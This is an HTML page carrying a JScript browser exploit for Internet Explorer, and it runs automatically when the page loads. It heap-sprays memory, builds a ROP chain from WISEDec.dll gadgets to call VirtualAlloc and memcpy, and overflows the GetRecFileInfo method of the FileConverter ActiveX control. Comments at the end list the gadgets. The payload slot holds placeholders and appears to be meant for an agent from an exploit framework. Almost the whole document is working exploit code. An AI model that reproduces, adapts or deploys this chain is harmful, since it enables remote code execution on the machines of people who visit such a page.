<html>

<head>
<meta http-equiv="X-UA-Compatible" content="IE=8" />
</head>

<body>

<script language="JScript.Encode">

function hs(code) {

    function padnum(n, numdigits)
    {
       n = n.toString();
       var pnum = '';
       if (numdigits > n.length)
       {
         for (z = 0; z < (numdigits - n.length); z++)
          pnum += '0';
       }
       return pnum + n.toString();
    }   
    
    chunk_size = 0x40000;
    //header + str_len [header][str_len] [unicode_str] [\x00\x00]
    headersize = 0x20 + 0x4; 
        
        
    // 0x100040f3 : POP EDI # POP ESI # POP EBP #  RETN
    // 0x10015191 : MOV ESP,EBX # POP EBX # RETN        
    nopsled = addr(0x100040f3) + addr(0x10015191) + addr(0x0c0c0c0c) + addr(0x100040f3);
    nopsled_len = chunk_size - (headersize + code.length);  
    while (nopsled.length < nopsled_len)
        nopsled += nopsled;
        
    //spray
    var store = new Array(500);
    store[0] = nopsled.substring(0, nopsled_len) + code;
    var codewithnum = null;
    for (i = 0 ; i < 500 ; i++)
    {
        codewithnum = padnum(i,4) + store[0];
        store[i] = codewithnum.substring(0, codewithnum.length);
    }
    
    //alert("spray done");
}

function hex(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}

function addr(address){
  return unescape("%u" + hex(address & 0xFFFF, 4) + "%u" + hex((address >> 16) & 0xFFFF, 4));
}

function transformToByte() {  
  /*
    Receives a variable number of int arguments and returns
    the hex string representation as an array
  */
  var i=0,
      res = [];
  for (i = 0; i< arguments.length; i++) {
       res.push(String.fromCharCode(arguments[i]));
  }
  return res.join("");  
}

function shellcode() {
    var rop = null,
        shellcode = null,
        rop_nop = null;
    /* ROP on WISEDec.dll (No ASLR)
    EBX = 0x0c0c0c0c
    ECX = 0x0c0c0c0c
    EAX = [ECX+2Ch]
    */
    // VirtualAlloc + Memcpy
    rop_nop = addr(0x10015194);
    rop_nop += addr(0x10015194);
    rop_nop += addr(0x10015194);
    rop_nop += addr(0x10015194);
    rop_nop += addr(0x10015194);
    rop_nop += addr(0x10015194);
    rop_nop += addr(0x10015194);
    rop_nop += addr(0x10015194);
    rop_nop += addr(0x10015194);
    rop_nop += addr(0x10015194);    
	
	rop = addr(0x100337ff); // XOR EDX,EDX # MOV EAX,ESI # POP ESI # POP EBX # RETN 10
	rop += addr(0xFFFFFFFF); // filler ESI
	rop += addr(0xFFFFFFFF); // filler ESI
	rop += addr(0x100330e3); // PUSH ESP # SUB EAX,0x20 # POP EBX # RETN 
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0x100338be); // ADD EDX,EBX # POP EBX # RETN 10
    rop += addr(0x000000AC); // Value to be added again to EDX to make it point to __AGENT_LOCATION__ (see below) 
	rop += addr(0x100338be); // ADD EDX,EBX # POP EBX # RETN 10
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0xffffffff); // filler ebx
	rop += addr(0x100330e3); // PUSH ESP # SUB EAX,0x20 # POP EBX # RETN 
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0x1002e968); // MOV EAX,EBX # POP ESI # POP EBX # POP EBP # RETN
	rop += addr(0xffffffff); // filler esi
	rop += addr(0xffffffff); // filler ebx
	//rop += addr(0x00000004); // EBX value to add later to EDX
	rop += addr(0xffffffff); // filler ebp
	rop += addr(0x1002e249); // # POP ECX # RETN 
	rop += addr(0xffffff58); // Value to be subtracted from EAX to get it point to NOP-SLED
	rop += addr(0x1003199a); // SUB EAX,ECX # RETN
	rop += addr(0x10002e23); // XCGH ECX,EAX # RETN 04
	rop += addr(0x100327e4); // MOV DWORD PTR DS:[EDX],ECX # RETN
	rop += addr(0xcafebabe); // padding (retn 04)
	//rop += addr(0x100338be); // ADD EDX,EBX # POP EBX # RETN 10
	//rop += addr(0xffffffff); // fillber ebx
	//rop += addr(0x100327e4); // MOV DWORD PTR DS:[EDX],ECX # RETN
	//rop += addr(0xcafebabe); // padding (retn 10)
	//rop += addr(0xcafebabe); // padding (retn 10)
	//rop += addr(0xcafebabe); // padding (retn 10)
	//rop += addr(0xcafebabe); // padding (retn 10)
	
	
    // Virtual Alloc Call Sequence
	rop += addr(0x100337ff); // XOR EDX,EDX # MOV EAX,ESI # POP ESI # POP EBX # RETN 10
	rop += addr(0xFFFFFFFF); // filler ESI
	rop += addr(0xFFFFFFFF); // filler ESI
	rop += addr(0x1003273d); // # POP EAX # RETN
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0xcafebabe); // padding (retn 10)
	rop += addr(0xcafebabe); // padding (retn 10)    
    rop += addr(0x10034030); // # IAT &ptr VirtualAlloc
    rop += addr(0x1002fc57); // # ADD EDX,DWORD PTR DS:[EAX] # POP ESI # POP EBP # RETN
    rop += addr(0x0c0c0c0c); // FILLER ESI
    rop += addr(0x0c0c0c0c); // FILLER EBP
    rop += addr(0x100327c3); // # MOV EAX,EDX # RETN
    rop += addr(0x1002e42d); // # PUSH EAX # RETN
    rop += addr(0x1002f6c7); // PUSH EAX # AND AL,0A # ADC BH,BH # ADC EAX,OFFSET_10034078 # POP ESI # RETN
    rop += addr(0x00000000); // LPADDRESS
    rop += addr(0x00004000); // DWSIZE
    rop += addr(0x00003000); // ALLOCTYPE : MEM_COMMIT | MEM_RESERVE
    rop += addr(0x00000040); // FLPROTECT : PAGE_EXECUTE_READWRITE
	
	rop += addr(0x100320f6); // POP EDI # RETN
	rop += addr(0xBABAB0B0); // Estimated location of Egg __AGENT_LOCATION__
	rop += addr(0x1003273d); // # POP EAX # RETN
	rop += addr(0x00002000); // Size of payload
	rop += addr(0x10031386); // CALL TO MEMCPY_0 Super Gadget 
	rop += addr(0xcafebabe); // PADDING
	rop += addr(0xcafebabe); // PADDING
	rop += addr(0xcafebabe); // PADDING
	rop += addr(0xcafebabe); // PADDING
	rop += addr(0xcafebabe); // PADDING
	rop += addr(0x10033258); // # INC EAX # RETN
	rop += addr(0x1002e53a); // CALL EAX
	rop += addr(0x90909090); // NOP
    rop += addr(0x90909090); // NOP
    rop += addr(0x90909090); // NOP
    rop += addr(0x90909090); // NOP
    rop += addr(0x90909090); // NOP
    rop += addr(0x90909090); // NOP
    rop += addr(0x90909090); // NOP
    rop += addr(0x90909090); // NOP
   
	
    
    shellcode = rop_nop + rop + unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc"); // unescape("__AGENT__");
    
    return shellcode;   
}

function expl() {
    var target = new ActiveXObject("FileConverter.FileConverterCtrl.1");
    
    var arg1 = "A";
    while (arg1.length < 0x100) {
        arg1 += "A";
    }
    arg1 += transformToByte(0x0c,0x0c,0x0c,0x0c); //obj+0x42d550 (+256)
    arg1 += transformToByte(0xca,0xfe,0xba,0xbe); //obj+0x42d554 (+260)
    arg1 += transformToByte(0x04); //obj+0x42d558 == 4  (+264)

    var arg2 = "travesti";
    
    var code = shellcode();
    hs(code);
    target.GetRecFileInfo( arg1, arg2 );
    //alert("after overflow");
}

expl();

</script>
</body>

<!-- MEMCPY_0 SuperGadget
WISEDec!decompress601_ex+0x2c836:
10031386 50              push    eax
10031387 57              push    edi
10031388 56              push    esi
10031389 e872020000      call    WISEDec!decompress601_ex+0x2cab0 (10031600) MEMCPY
1003138e 83c410          add     esp,10h
10031391 5f              pop     edi
10031392 5e              pop     esi
10031393 5b              pop     ebx
10031394 5d              pop     ebp
10031395 c3              ret
-->

<!--
[x] Valid gadget at: 100330e3
 matches: ebx=esp

0x100337ff :  # XOR EDX,EDX # MOV EAX,ESI # POP ESI # POP EBX # RETN 10

100330e3 : PUSH ESP # SUB EAX,0x20 # POP EBX # RETN 

1002e968 : MOV EAX,EBX # POP ESI # POP EBX # POP EBP # RETN

10002e23 : XCGH ECX,EAX # RETN 04

esi=esp
100337f1 : push esp # and al,0x10 # ja 0x100337fe # jb 0x100337ff # cmp eax,[esp+0xc] # jbe 0x100337ff #  dec esi # xor edx,edx # mov eax,esi # pop esi # pop ebx # ret 0x10


0x100320c1 :  # ADD BL,AL # MOV EAX,804 # RETN    ** [WISEDEC.dll] 

0x100338be : # ADD EDX,EBX # POP EBX # RETN
0x100327c3 :  # MOV EAX,EDX # RETN    ** [WISEDEC.dll]
0x100327e4 : # MOV DWORD PTR DS:[EDX],ECX # RETN
-->

</html>